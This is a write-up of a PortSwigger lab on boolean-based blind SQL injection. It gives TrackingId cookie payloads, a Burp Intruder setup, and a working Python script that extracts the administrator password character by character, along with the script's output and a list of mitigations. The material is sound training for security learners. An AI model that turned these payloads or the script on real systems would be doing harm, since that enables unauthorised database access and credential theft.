# Blind SQL Injection with Conditional Responses

**Difficulty:** Practitioner  
**Lab Source:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Blind / Boolean-Based  
**Status:** Solved 

---

## Overview

This lab contains a **blind SQL injection** vulnerability in the `TrackingId` cookie. Unlike classic SQLi, query results are never shown — the only feedback is whether a **"Welcome back"** message appears in the response.

By crafting boolean conditions, we can ask the database yes/no questions and extract data one character at a time.

**Goal:** Find the `administrator` password from the `users` table and log in.

---

## Key Concepts

| Concept | Description |
|---|---|
| Blind SQLi | No data returned in response; inference via boolean side-channel |
| Boolean oracle | True condition → "Welcome back" shown; false → hidden |
| `SUBSTRING(str, pos, len)` | Extracts one character at a time |
| `LENGTH(str)` | Returns string length |
| Character brute-force | Test each position against `a–z`, `0–9` |

---

## Vulnerability

The application runs a query like:

```sql
SELECT * FROM tracking WHERE id = '<TrackingId>'
```

User input is injected unsanitised. No output is reflected, but the "Welcome back" message leaks boolean results — a classic **boolean-based blind SQLi** oracle.

---

## Manual Exploitation (Burp Suite)

### Step 1 — Verify Boolean Behaviour

True condition → Welcome back appears:
```
TrackingId=xyz' AND '1'='1
```
False condition → Welcome back disappears:
```
TrackingId=xyz' AND '1'='2
```

### Step 2 — Confirm `users` Table Exists
```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

### Step 3 — Confirm `administrator` User Exists
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

### Step 4 — Determine Password Length

Increment until Welcome back disappears:
```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
...
```
**Result: password is 20 characters long**

### Step 5 — Extract Each Character (Burp Intruder)

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

- **Attack type:** Cluster bomb
- **Payload 1:** positions 1–20
- **Payload 2:** `a–z`, `0–9`
- **Grep:** `Welcome back`

---

## Automated Exploitation — Python Script

Burp Community Intruder is heavily throttled. This Python script completes the same attack in seconds:

```python
import requests
import string

# Target URL
url = "https://0acf0024036c1378801653a800e3000f.web-security-academy.net/filter?category=Accessories"

# Base TrackingId (WITHOUT injection part)
tracking_id = "U8sz74OYetWfpt19"

# Session cookie
session_cookie = "OKO7i0Bg0EUBHKnX91F7rA0RDIZVq7Qj"

# Characters to test
charset = string.ascii_lowercase + string.digits

# Extracted password
password = ""

for position in range(1, 21):  # 1 to 20
    print(f"[+] Testing position {position}...")

    for char in charset:
        payload = (
            f"{tracking_id}' AND "
            f"(SELECT SUBSTRING(password,{position},1) FROM users "
            f"WHERE username='administrator')='{char}'--"
        )

        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }

        response = requests.get(url, cookies=cookies)

        if "Welcome back" in response.text:
            print(f"[✔] Found character at position {position}: {char}")
            password += char
            break

    else:
        print(f"[!] No match found at position {position}")

print(f"\n Extracted Password: {password}")
```

> **Note:** `tracking_id` and `session_cookie` values are unique per lab instance. Update them for each new lab session.

---

## Script Output (Real Lab Run)

```
[+] Testing position 1...   [✔] Found character at position 1: 6
[+] Testing position 2...   [✔] Found character at position 2: 0
[+] Testing position 3...   [✔] Found character at position 3: i
[+] Testing position 4...   [✔] Found character at position 4: 6
[+] Testing position 5...   [✔] Found character at position 5: a
[+] Testing position 6...   [✔] Found character at position 6: x
[+] Testing position 7...   [✔] Found character at position 7: d
[+] Testing position 8...   [✔] Found character at position 8: y
[+] Testing position 9...   [✔] Found character at position 9: x
[+] Testing position 10...  [✔] Found character at position 10: h
[+] Testing position 11...  [✔] Found character at position 11: d
[+] Testing position 12...  [✔] Found character at position 12: a
[+] Testing position 13...  [✔] Found character at position 13: 9
[+] Testing position 14...  [✔] Found character at position 14: z
[+] Testing position 15...  [✔] Found character at position 15: d
[+] Testing position 16...  [✔] Found character at position 16: e
[+] Testing position 17...  [✔] Found character at position 17: h
[+] Testing position 18...  [✔] Found character at position 18: 4
[+] Testing position 19...  [✔] Found character at position 19: 6
[+] Testing position 20...  [✔] Found character at position 20: 7

 Extracted Password: 60i6axdyxhda9zdeh467
```

---

## Why Python Over Burp Community Intruder?

| Method | Speed | Notes |
|---|---|---|
| Burp Community Intruder | Very slow (throttled) | Rate-limited; impractical for 20×36 = 720 requests |
| Burp Pro Intruder | Fast | No throttle, but requires paid license |
| Python `requests` | Fast | Free, unthrottled, full control |

The Python script sends ~720 requests (20 positions × 36 chars) with no artificial delay, finishing in under a minute.

---

## Files in This Repo

| File | Description |
|---|---|
| `README.md` | This writeup |
| `blind_sqli.py` | Python automation script |
| `Blind_SQLi_Writeup.docx` | Detailed Word document writeup |

---

## Mitigations

- **Parameterized queries** — User input is treated as data, never as SQL code
- **Least privilege** — App DB user should not be able to read the `users` table
- **Cookie integrity** — Sign/encrypt tracking cookies to prevent value tampering
- **WAF** — Secondary layer to detect boolean injection patterns in headers/cookies
